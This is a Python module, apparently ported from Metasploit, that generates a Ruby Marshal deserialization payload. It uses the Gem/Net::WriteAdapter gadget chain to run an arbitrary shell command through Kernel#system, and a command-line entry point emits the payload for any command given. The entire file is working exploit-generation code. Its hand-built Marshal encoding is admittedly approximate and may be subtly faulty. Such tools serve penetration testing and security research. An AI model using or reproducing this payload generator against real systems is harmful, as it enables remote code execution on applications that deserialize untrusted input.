#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
MSF Ruby Deserialization Utility

This module provides payloads for exploiting Ruby deserialization vulnerabilities.
"""

import struct
import random
import string


class RubyDeserialization:
    """Ruby deserialization class with exploit payloads"""
    
    @staticmethod
    def _rand_text_alphanumeric(length_range):
        """Generate random alphanumeric text"""
        if isinstance(length_range, range):
            length = random.randint(length_range.start, length_range.stop)
        else:
            length = length_range
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    @staticmethod
    def _marshal_dump_string(s):
        """
        Minimal Marshal dump for strings (Ruby's Marshal format)
        This is a simplified version that handles basic strings
        """
        # Ruby Marshal format: \x04\b for version, I for string, then length + data
        encoded = s.encode('utf-8')
        length = len(encoded)
        # Format: version (04 08) + type (I) + length + string + encoding marker
        return b'\x04\x08I' + chr(length + 5).encode('latin-1') + encoded + b'\x06:\x06ET'
    
    # Payload definitions
    # That could be in the future a list of payloads used to exploit the Ruby deserialization vulnerability.
    @staticmethod
    def _payload_net_writeadapter(command):
        """
        Generate net_writeadapter payload
        Reference: https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
        """
        rand_str = RubyDeserialization._rand_text_alphanumeric(range(12, 21))
        # Note: This is a complex Marshal format payload
        # The original Ruby uses Marshal.dump which we approximate here
        rand_marshal = RubyDeserialization._marshal_dump_string(rand_str)[2:-1]  # Strip version bytes
        cmd_marshal = RubyDeserialization._marshal_dump_string(command)[2:-1]    # Strip version bytes
        
        payload = (
            b"\x04\x08[\x08c\x15Gem::SpecFetcherc\x13Gem::InstallerU:\x15Gem::Requirement"
            b"[\x06o:\x1cGem::Package::TarReader\x06:\x08@ioo:\x14Net::BufferedIO\x07;\x07o:"
            b"\x23Gem::Package::TarReader::Entry\x07:\n@readi\x00:\x0c@headerI" +
            rand_marshal +
            b"\x06:\x06ET:\x12@debug_outputo:\x16Net::WriteAdapter\x07:\x0c@socketo:\x14"
            b"Gem::RequestSet\x07:\n@setso;\x0e\x07;\x0fm\x0bKernel:\x0f@method_id:\x0bsystem:\r"
            b"@git_setI" +
            cmd_marshal +
            b"\x06;\x0cT;\x12:\x0cresolve"
        )
        return payload
    
    PAYLOADS = {
        'net_writeadapter': _payload_net_writeadapter.__func__
    }
    
    @classmethod
    def payload(cls, payload_name, command=None):
        """
        Get a deserialization payload by name
        
        Args:
            payload_name: Name of the payload (e.g., 'net_writeadapter')
            command: Command to execute (required for most payloads)
            
        Returns:
            Bytes containing the serialized payload
            
        Raises:
            ValueError: If payload name is not found
        """
        payload_name_sym = payload_name if isinstance(payload_name, str) else str(payload_name)
        
        if payload_name_sym not in cls.payload_names():
            raise ValueError(f"{payload_name} payload not found in payloads")
        
        return cls.PAYLOADS[payload_name_sym](command)
    
    @classmethod
    def payload_names(cls):
        """
        Get list of available payload names
        
        Returns:
            List of payload name strings
        """
        return list(cls.PAYLOADS.keys())


if __name__ == '__main__':
    import sys
    
    # Example usage
    print("Available Ruby deserialization payloads:")
    for name in RubyDeserialization.payload_names():
        print(f"  - {name}")
    
    if len(sys.argv) > 1:
        command = sys.argv[1]
        payload = RubyDeserialization.payload('net_writeadapter', command)
        print(f"\nGenerated payload for command: {command}")
        print(f"Payload length: {len(payload)} bytes")
        print(f"First 100 bytes (hex): {payload[:100].hex()}")
    else:
        print("\nUsage: python3 ruby_deserialization.py 'command to execute'")
